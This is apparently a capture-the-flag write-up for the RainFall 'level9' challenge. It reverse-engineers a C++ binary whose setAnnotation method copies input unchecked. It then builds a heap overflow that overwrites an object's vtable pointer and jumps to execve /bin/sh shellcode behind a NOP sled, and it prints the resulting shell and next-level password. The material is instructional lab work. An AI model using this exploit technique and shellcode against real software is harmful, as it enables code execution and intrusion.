# Level 9


```sh
(gdb) info func
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
(gdb) 

(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
(gdb) 

```


In the functions informations, we guess the binary comes from c++, since its using the STD.

```c++

void __thiscall N::N(N *this,int param_1)

{
  *(undefined ***)this = &PTR_operator+_08048848;
  *(int *)(this + 0x68) = param_1;
  return;
}

void __thiscall N::setAnnotation(N *this,char *param_1)

{
  size_t __n;
  
  __n = strlen(param_1);
  memcpy(this + 4,param_1,__n);
  return;
}

void main(int param_1,int param_2)

{
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  this = (N *)operator.new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator.new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}
```

The program wait one argument.

```sh
level9@RainFall:~$ ./level9
level9@RainFall:~$ echo $?
1
level9@RainFall:~$ ./level9 lol
level9@RainFall:~$ echo $? 
11
level9@RainFall:~$ ./level9 lollollllll
level9@RainFall:~$ echo $? 
11
level9@RainFall:~$ 
```


The function setAnnotation execute the memcpy so we can overflow the program.

```sh
level9@RainFall:~$ ./level9 $(python -c "print 'A' * 109")
Segmentation fault (core dumped)
level9@RainFall:~$ 
```

We are going to make the programs points to our shellcode, for that we are going to push it into the stack, and then give the programs the address of where the shellcode is located.

Im gonna push the shellcode into av[2], so we need his address.


Lets put a breakpoint right after the setAnnotation function.
```sh
(gdb) br *main+136
Breakpoint 1 at 0x804867c
(gdb)
```


Now we are going to put some flag at av[1] and av[2] adress like that
```sh
(gdb) run $(python -c "print 'A' * 108") $(python -c "print 'B' * 108")
(gdb) x/200x $esp
0xbffff600:	0x0804a008	0xbffff7fa	0xbffff6d4	0xb7d79e55
0xbffff610:	0x0804a078	0x0804a008	0x0804a078	0x0804a008
0xbffff620:	0x08048770	0xb7eebff4	0x00000000	0xb7d604d3
0xbffff630:	0x00000003	0xbffff6c4	0xbffff6d4	0xb7fdc860
0xbffff640:	0x00000000	0xbffff61c	0xbffff6d4	0x00000000
0xbffff650:	0x08048288	0xb7eebff4	0x00000000	0x00000000
0xbffff660:	0x00000000	0x77678cce	0x2482c8de	0x00000000
0xbffff670:	0x00000000	0x00000000	0x00000003	0x08048540
0xbffff680:	0x00000000	0xb7ff26b0	0xb7d603e9	0xb7ffeff4
0xbffff690:	0x00000003	0x08048540	0x00000000	0x08048561
0xbffff6a0:	0x080485f4	0x00000003	0xbffff6c4	0x08048770
0xbffff6b0:	0x080487e0	0xb7fed280	0xbffff6bc	0xb7fff918
0xbffff6c0:	0x00000003	0xbffff7e1	0xbffff7fa	0xbffff867
0xbffff6d0:	0x00000000	0xbffff8d4	0xbffff8e4	0xbffff8f8
0xbffff6e0:	0xbffff917	0xbffff92a	0xbffff936	0xbffffe57
0xbffff6f0:	0xbffffe63	0xbffffeb0	0xbffffec6	0xbffffed5
0xbffff700:	0xbffffeeb	0xbfffff2c	0xbfffff3d	0xbfffff46
0xbffff710:	0xbfffff5d	0xbfffff65	0xbfffff74	0xbfffffa1
0xbffff720:	0xbfffffc1	0x00000000	0x00000020	0xb7fdd418
0xbffff730:	0x00000021	0xb7fdd000	0x00000010	0x178bfbff
0xbffff740:	0x00000006	0x00001000	0x00000011	0x00000064
0xbffff750:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffff760:	0x00000005	0x00000008	0x00000007	0xb7fde000
0xbffff770:	0x00000008	0x00000000	0x00000009	0x08048540
0xbffff780:	0x0000000b	0x000007d9	0x0000000c	0x000007d9
0xbffff790:	0x0000000d	0x000007d9	0x0000000e	0x000007d9
0xbffff7a0:	0x00000017	0x00000000	0x00000019	0xbffff7cb
0xbffff7b0:	0x0000001f	0xbfffffe3	0x0000000f	0xbffff7db
0xbffff7c0:	0x00000000	0x00000000	0xba000000	0xf63624fb
0xbffff7d0:	0xd9d8c445	0x1d242db5	0x693509fa	0x00363836
0xbffff7e0:	0x6f682f00	0x752f656d	0x2f726573	0x6576656c
0xbffff7f0:	0x6c2f396c	0x6c657665	0x41410039	0x41414141
0xbffff800:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff810:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff820:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff830:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff840:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff850:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff860:	0x41414141	0x42004141	0x42424242	0x42424242
0xbffff870:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff880:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff890:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff8a0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff8b0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff8c0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff8d0:	0x00424242	0x4c454853	0x622f3d4c	0x622f6e69
0xbffff8e0:	0x00687361	0x4d524554	0x6574783d	0x322d6d72
0xbffff8f0:	0x6f633635	0x00726f6c	0x5f485353	0x45494c43
0xbffff900:	0x313d544e	0x2e302e30	0x20322e32	0x33383833
0xbffff910:	0x32342032	0x53003234	0x545f4853	0x2f3d5954

```
0x42 is the B, so av[2] start at 0xbfff860 + 8 = 0xbfff868.

Then we are going to overwrite EAX so it points to that address, (a pointer to a pointer basically).

We will write 0xbfff868 at the beginning of av[1] so we are going to the start of that address :

```sh
(gdb) x/x $esp
0xbffff600:	0x0804a008
(gdb) x/200x 0x0804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
0x804a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a108:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a118:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a128:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a138:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a148:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a158:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a168:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a178:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a188:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a198:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a1a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a1b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a1c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a1d8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a1e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a1f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a208:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a218:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a228:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a238:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a248:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a258:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a268:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a278:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a288:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a298:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2d8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a2f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a308:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a318:	0x00000000	0x00000000	0x00000000	0x00000000


```

And the beggining of av[1] is 0x804a008 + 4 = 0x804a00c.

From that we can now write all the shellcode into av[2] and it should get executed.

I am going to use this shellcode

```sh
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

We are going to add some NOP's behind it so that we increase the chance it get executed.

```sh
$(python -c "print '\x68\xf8\xff\xbf' + 'A' * 104 + '\x0c\xa0\x04\x08'") $(python -c "print '\x90'*1000 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
```



```sh
level9@RainFall:~$ ./level9 $(python -c "print '\x68\xf8\xff\xbf' + 'A' * 104 + '\x0c\xa0\x04\x08'") $(python -c "print '\x90'*1000 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
```

And it worked